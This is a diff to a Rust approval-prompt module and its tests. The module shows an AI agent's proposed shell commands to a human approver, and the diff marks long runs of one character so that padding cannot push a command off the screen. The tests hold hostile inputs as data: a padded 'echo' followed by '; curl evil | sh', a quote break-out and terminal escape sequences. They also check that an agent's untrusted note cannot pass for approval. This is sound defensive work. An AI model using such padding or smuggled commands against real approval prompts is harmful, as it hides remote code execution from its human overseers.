@@ -79,7 +79,7 @@ impl Prompt {
         note: Option<&str>,
         risk_tags: Vec<String>,
     ) -> Self {
-        let full = action_text(&bound.action);
+        let full = shown_text(&action_pieces(&bound.action));
         let (action, truncated) = cut(&full, ACTION_CHARS);
         Self {
             id,
@@ -104,48 +104,13 @@ impl Prompt {
     }
 }
 
-/// The prompt as a terminal shows it (the CLI prints it; Task 12).
-#[must_use]
-pub fn terminal(p: &Prompt) -> String {
-    let mut s = format!(
-        "approval {} (session {}, call {})\n  action: {}\n",
-        p.id, p.session, p.call, p.action
-    );
-    if p.truncated {
-        s.push_str("  (cut: the full action must be shown before it can be approved)\n");
-    }
-    if !p.risk_tags.is_empty() {
-        let _ = writeln!(s, "  risk: {}", p.risk_tags.join(", "));
-    }
-    let _ = writeln!(s, "  digest: {}", p.digest);
-    // Last, and quoted, so it cannot pose as one of the lines above.
-    if let Some(n) = &p.note {
-        let _ = writeln!(s, "  from the agent (untrusted, not the action): {n}");
-    }
-    s
-}
-
 /// The agent's note: quoted and escaped up to [`NOTE_CHARS`] characters, the rest named by its
 /// length and the hash of the raw note. Only the shown part is escaped (bounds first).
 fn note_text(n: &str) -> String {
-    let mut out = String::from("\"");
-    let mut used = 0usize;
-    let mut unit = String::new();
-    for c in n.chars() {
-        unit.clear();
-        if c == '"' {
-            unit.push_str("\\\"");
-        } else {
-            push_escaped(&mut unit, c);
-        }
-        // Room for the closing quote too: the quoted note is at most NOTE_CHARS.
-        if out.len().saturating_add(unit.len()).saturating_add(1) > NOTE_CHARS {
-            break;
-        }
-        out.push_str(&unit);
-        used = used.saturating_add(c.len_utf8());
-    }
-    out.push('"');
+    // Room for both quotes: the quoted note is at most NOTE_CHARS.
+    let (shown, used) =
+        sally_core::text::escape_runs_capped(n.as_bytes(), NOTE_CHARS.saturating_sub(2));
+    let mut out = format!("\"{shown}\"");
     if used < n.len() {
         let sha = hex(&Sha256::digest(n.as_bytes()));
         let _ = write!(
@@ -155,6 +120,25 @@ fn note_text(n: &str) -> String {
         );
     }
     out
+}
+
+/// The action as a prompt shows it, uncut: each literal as it is, each raw piece escaped with
+/// its runs of one unit marked (`sally_core::text::escape_runs_backslash_quoted`, RT-AG-04), one
+/// piece at a time, so a run never spans two pieces and the broker's words are never marked.
+/// The digest and the audit take the unmarked [`action_text`].
+fn shown_text(pieces: &[Piece]) -> String {
+    let mut whole = String::new();
+    for p in pieces {
+        match p {
+            Piece::Literal(l) => whole.push_str(l),
+            Piece::Raw(r) => {
+                whole.push_str(&sally_core::text::escape_runs_backslash_quoted(
+                    r.as_bytes(),
+                ));
+            }
+        }
+    }
+    whole
 }
 
 /// The action as text: fixed broker words, then each value escaped and quoted; the
@@ -289,14 +273,6 @@ impl Pieces {
 #[must_use]
 pub fn escape(s: &str) -> String {
     sally_core::text::escape(s.as_bytes())
-}
-
-/// One character through the shared escaper, for the quoted and capped forms built here.
-fn push_escaped(out: &mut String, c: char) {
-    let mut buf = [0u8; 4];
-    out.push_str(&sally_core::text::escape(
-        c.encode_utf8(&mut buf).as_bytes(),
-    ));
 }
 
 /// `text` (escaped ASCII) cut at `max` characters, never inside an escape, with an explicit tail
@@ -487,7 +463,8 @@ mod tests {
 
     #[test]
     fn a_long_action_is_cut_with_a_tail_and_kept_whole_in_full() {
-        let long = "a".repeat(50 * 1024);
+        // No run to mark: the shown full text is the unmarked action text byte for byte.
+        let long = unrun(50 * 1024);
         let p = prompt(shell(&["echo", &long]), None);
         assert!(p.truncated);
         let full = action_text(&shell(&["echo", &long]));
@@ -534,22 +511,26 @@ mod tests {
         );
         assert!(!p.action.contains("APPROVED"));
         // The bound counts the quotes; the tail names the raw bytes left and the raw hash.
-        let raw = "n".repeat(NOTE_CHARS);
+        let raw = unrun(NOTE_CHARS);
         let long = prompt(shell(&["ls"]), Some(&raw));
         let sha = hex(&Sha256::digest(raw.as_bytes()));
-        let shown = "n".repeat(NOTE_CHARS - 2);
+        let shown = unrun(NOTE_CHARS - 2);
         assert_eq!(
             long.note.unwrap(),
             format!("\"{shown}\"... (+2 bytes, sha256 {sha})")
         );
+        // A run of one character is marked in the note too (RT-AG-04), so it is not cut.
+        let run = prompt(shell(&["ls"]), Some(&"n".repeat(NOTE_CHARS)));
+        assert_eq!(run.note.as_deref(), Some("\"n\\{500}\""));
         // Exactly NOTE_CHARS with both quotes: shown whole.
-        let fits = "n".repeat(NOTE_CHARS - 2);
+        let fits = unrun(NOTE_CHARS - 2);
         let p = prompt(shell(&["ls"]), Some(&fits));
         let note = p.note.unwrap();
         assert_eq!(note, format!("\"{fits}\""));
         assert_eq!(note.len(), NOTE_CHARS);
         // Only the shown part is escaped: a note of escapes stops at the bound.
-        let p = prompt(shell(&["ls"]), Some(&"\x1b".repeat(100_000)));
+        let escapes: String = "\x1b\x07".chars().cycle().take(100_000).collect();
+        let p = prompt(shell(&["ls"]), Some(&escapes));
         let note = p.note.unwrap();
         assert!(note.len() < NOTE_CHARS + 100, "{}", note.len());
         assert!(note.contains("... (+"));
@@ -595,6 +576,12 @@ mod tests {
                 shell(&["echo", &" ".repeat(50 * 1024), "; curl evil | sh"]),
                 None,
             ),
+            // The same size with no run to mark: cut, and its full text follows.
+            (
+                "padding-50k-no-run",
+                shell(&["echo", &unrun(50 * 1024), "; curl evil | sh"]),
+                None,
+            ),
             (
                 "quote-break-out",
                 shell(&["echo", "x\"] in \"/workspace/safe"]),
@@ -603,14 +590,20 @@ mod tests {
             // `run ["echo" "` is 13 characters: the ESC escape starts 2 before the cut.
             (
                 "escape-across-the-cut",
-                shell(&["echo", &(" ".repeat(ACTION_CHARS - 15) + "\x1b[2J")]),
+                shell(&["echo", &(unrun(ACTION_CHARS - 15) + "\x1b[2J")]),
                 None,
             ),
         ];
         let mut out = String::new();
+        let control = laid_out(&prompt(shell(&["ls", "-la"]), None)).shown;
+        assert!(
+            control.contains("\n  | run [\"ls\" \"-la\"] in \"/workspace/p\"\n")
+                && !control.contains('\\'),
+            "control: a plain command is shown as it is:\n{control}"
+        );
         for (name, action, note) in payloads {
             let p = prompt(action, note.as_deref());
-            let text = terminal(&p);
+            let text = laid_out(&p).shown;
             // One logical line per field: no raw control character survives.
             assert!(!text.chars().any(|c| c.is_control() && c != '\n'), "{name}");
             // All ASCII, the cut's tail included (architect Q74: a client's clean-check passes it).
@@ -623,9 +616,30 @@ mod tests {
                     assert!(!shown.ends_with(partial), "{name}: {shown}");
                 }
             }
-            let _ = writeln!(out, "== {name}\n{text}");
+            let _ = writeln!(out, "== {name}\n{}", fold_full(&text));
         }
         insta::assert_snapshot!(out);
+    }
+
+    /// `text` with the guttered rows of its full action counted, not listed, for the snapshot.
+    fn fold_full(text: &str) -> String {
+        let (mut out, mut rows, mut in_full) = (String::new(), 0usize, false);
+        for line in text.lines() {
+            if in_full && line.starts_with(sally_cli::approve::GUTTER) {
+                rows += 1;
+                continue;
+            }
+            if in_full {
+                let _ = writeln!(out, "  | ({rows} rows of the full action)");
+                in_full = false;
+            }
+            in_full = line == "  full action:";
+            let _ = writeln!(out, "{line}");
+        }
+        if in_full {
+            let _ = writeln!(out, "  | ({rows} rows of the full action)");
+        }
+        out
     }
 
     /// Columns and rows of the screen RT-AG-04's padded case is judged on.
@@ -647,19 +661,24 @@ mod tests {
         rows
     }
 
-    /// What a client prints for `p` before its question, and whether approve is offered.
+    /// `p` as sent on the wire, laid out by the CLI on a screen of [`SCREEN`].
+    fn laid_out(p: &Prompt) -> sally_cli::approve::Layout {
+        let size = sally_cli::approve::Size {
+            columns: u16::try_from(SCREEN.0).unwrap(),
+            rows: u16::try_from(SCREEN.1).unwrap(),
+        };
+        sally_cli::approve::layout(&crate::rpc::control_wire::prompt(p), Some(size))
+    }
+
+    /// What the CLI prints for `p` before its question, and whether approve is offered.
     fn before_the_question(p: &Prompt) -> (String, bool) {
-        let mut shown = terminal(p);
-        let mut approvable = true;
-        if p.truncated {
-            match p.full_on_wire() {
-                Some(full) => {
-                    let _ = writeln!(shown, "  full action:\n{full}");
-                }
-                None => approvable = false,
-            }
-        }
-        (shown, approvable)
+        let l = laid_out(p);
+        (l.shown, !l.deny_only)
+    }
+
+    /// `n` characters with no run of one character longer than 16.
+    fn unrun(n: usize) -> String {
+        "ab".chars().cycle().take(n).collect()
     }
 
     /// Whether `marker` is within the last screen before the question: the question takes the
@@ -684,39 +703,39 @@ mod tests {
             in_the_last_screen(&plain, marker),
             "control: the unpadded twin shows its command:\n{plain}"
         );
-        let pad = " ".repeat(100 * 1024);
-        let p = prompt(shell(&[marker, &pad, "tail"]), None);
-        let (shown, approvable) = before_the_question(&p);
-        let tail: String = shown
-            .chars()
-            .rev()
-            .take(400)
-            .collect::<Vec<_>>()
-            .into_iter()
-            .rev()
-            .collect();
-        assert!(
-            !approvable || in_the_last_screen(&shown, marker),
-            "approvable, and the last screen before the question does not hold the command: ...{tail}"
-        );
-    }
-
-    #[test]
-    fn the_terminal_shows_risk_cut_and_note_lines_only_when_present() {
-        let plain = terminal(&prompt(shell(&["ls"]), None));
-        assert!(!plain.contains("risk:") && !plain.contains("from the agent"));
-        assert!(!plain.contains("(cut:"));
-        let b = bound(shell(&["echo", &"a".repeat(ACTION_CHARS)]));
-        let p = Prompt::new(
-            "x".to_owned(),
-            &b,
-            Some("why"),
-            vec!["destructive".to_owned()],
-        );
-        let t = terminal(&p);
-        assert!(t.contains("  risk: destructive\n"));
-        // The note is quoted and comes last, after the digest.
-        assert!(t.ends_with("  from the agent (untrusted, not the action): \"why\"\n"));
-        assert!(t.contains("(cut: the full action must be shown before it can be approved)"));
+        let spaces = prompt(shell(&[marker, &" ".repeat(100 * 1024), "tail"]), None);
+        // Its own defence: the run is marked with its exact count, so the action is not cut.
+        assert!(!spaces.truncated && spaces.action.contains("\" \\{102400}\""));
+        let words = prompt(shell(&[marker, &unrun(100 * 1024), "tail"]), None);
+        assert!(words.truncated && words.full_on_wire().is_some());
+        let over = prompt(shell(&[marker, &unrun(FULL_WIRE_BYTES), "tail"]), None);
+        assert!(over.full_on_wire().is_none());
+        for (name, p) in [
+            ("spaces", spaces),
+            ("no run", words),
+            ("over the wire cap", over),
+        ] {
+            let (shown, approvable) = before_the_question(&p);
+            let tail: String = shown
+                .chars()
+                .rev()
+                .take(400)
+                .collect::<Vec<_>>()
+                .into_iter()
+                .rev()
+                .collect();
+            assert!(
+                !approvable || in_the_last_screen(&shown, marker),
+                "{name}: approvable, and the last screen before the question does not hold the \
+                 command: ...{tail}"
+            );
+            if name == "no run" {
+                // Its own defence: the start of the action is printed again above the question.
+                assert!(
+                    approvable && shown.contains("the start of its action again"),
+                    "{name}"
+                );
+            }
+        }
     }
 }
